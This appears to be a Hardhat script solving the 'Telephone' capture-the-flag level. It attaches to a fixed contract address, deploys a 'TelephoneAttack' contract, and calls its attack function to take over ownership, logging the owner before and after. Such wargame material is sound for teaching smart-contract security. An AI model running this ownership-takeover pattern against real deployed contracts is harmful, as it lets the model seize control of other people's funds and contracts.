const hre = require("hardhat");

function sleep(milliseconds) {
  const date = Date.now();
  let currentDate = null;
  do {
    currentDate = Date.now();
  } while (currentDate - date < milliseconds);
}

async function main() {
  const [owner] = await ethers.getSigners();
  const contractAddress = hre.ethers.utils.getAddress(
    "0x06d525c1000c37fB6b12bbE411fa3cccBF7b848d"
  );

  const Contract = await hre.ethers.getContractFactory("Telephone");
  const contractInstance = await Contract.attach(contractAddress);

  console.log(contractInstance.functions);

  const AttackContract = await hre.ethers.getContractFactory("TelephoneAttack");
  const attackContractInstance = await AttackContract.deploy();
  await attackContractInstance.deployed();

  console.log("attack contract address", attackContractInstance.address);

  console.log("contrat owner before", await contractInstance.owner());

  await attackContractInstance.attack(owner.address);

  sleep(10000); // wait for the transaction to be mined

  console.log("contrat owner after", await contractInstance.owner());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
